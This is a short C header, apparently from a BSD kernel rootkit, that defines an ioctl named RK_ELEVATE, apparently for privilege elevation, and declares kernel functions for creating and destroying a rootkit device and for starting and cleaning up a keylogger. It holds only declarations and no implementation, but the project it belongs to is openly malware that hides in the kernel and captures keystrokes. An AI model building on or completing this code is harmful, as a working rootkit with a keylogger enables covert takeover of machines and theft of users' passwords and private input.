#ifndef ROOTKIT_DEVICE_H
#define ROOTKIT_DEVICE_H

#include <sys/ioccom.h>

#define RK_ELEVATE _IO('R', 1)

#ifdef _KERNEL
int make_rk_dev(void);
void destroy_rk_dev(void);
void init_keylogger(void);
void cleanup_keylogger(void);
#endif

#endif
